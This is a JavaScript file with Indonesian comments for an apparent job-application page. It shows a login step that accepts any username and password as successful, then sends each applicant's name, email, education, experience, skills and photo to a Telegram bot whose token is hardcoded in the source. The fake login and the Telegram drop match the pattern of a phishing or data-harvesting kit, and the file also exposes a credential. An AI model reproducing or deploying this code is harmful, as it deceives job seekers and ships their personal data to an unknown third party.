const botToken = "7595276003:AAH_K5VI6YosFAzu_h6XfNDhZ-qc_pj4wGQ"; // Ganti dengan token bot Telegram Anda
const chatId = "7595276003"; // Ganti dengan ID chat di mana pesan akan dikirim

// Fungsi untuk lanjut ke form password
function nextStep() {
  document.getElementById("popupUsername").style.display = "none";
  document.getElementById("popupPassword").style.display = "block";
}

// Fungsi untuk login dan lanjut ke form CV
function submitLogin() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if (username && password) {
    alert("Login berhasil. Lanjutkan ke form CV.");
    document.getElementById("loginPage").style.display = "none";
    document.getElementById("cvPage").style.display = "block";
  } else {
    alert("Silakan masukkan username dan password.");
  }
}

// Fungsi untuk mengirim data CV ke bot Telegram
function submitCV() {
  const fullName = document.getElementById("fullName").value;
  const email = document.getElementById("email").value;
  const education = document.getElementById("education").value;
  const experience = document.getElementById("experience").value;
  const skills = document.getElementById("skills").value;
  const photo = document.getElementById("photo").files[0];

  if (fullName && email && education && experience && skills && photo) {
    const message = `
    CV Lamaran Kerja:\n
    Nama Lengkap: ${fullName}\n
    Email: ${email}\n
    Pendidikan Terakhir: ${education}\n
    Pengalaman Kerja: ${experience}\n
    Keterampilan: ${skills}
    `;

    // Kirim data teks CV terlebih dahulu
    sendMessageToTelegram(message);

    // Setelah data teks dikirim, kirim foto
    sendPhotoToTelegram(photo);

    alert("CV dan foto berhasil dikirim ke bot Telegram.");
    document.getElementById("cvForm").reset();
  } else {
    alert("Lengkapi semua form sebelum mengirim.");
  }
}

// Fungsi untuk mengirim pesan teks ke Telegram
function sendMessageToTelegram(message) {
  const url = `https://api.telegram.org/bot7595276003:AAH_K5VI6YosFAzu_h6XfNDhZ-qc_pj4wGQ/sendMessage`;
  const data = {
    chat_id: chatId,
    text: message,
  };

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  })
  .then(response => response.json())
  .then(data => console.log("Pesan berhasil dikirim ke Telegram"))
  .catch(error => console.error("Error:", error));
}

// Fungsi untuk mengirim foto ke Telegram
function sendPhotoToTelegram(photo) {
  const url = `https://api.telegram.org/bot7595276003:AAH_K5VI6YosFAzu_h6XfNDhZ-qc_pj4wGQ/sendPhoto`;
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", photo);

  fetch(url, {
    method: "POST",
    body: formData,
  })
  .then(response => response.json())
  .then(data => console.log("Foto berhasil dikirim ke Telegram"))
  .catch(error => console.error("Error:", error));
}
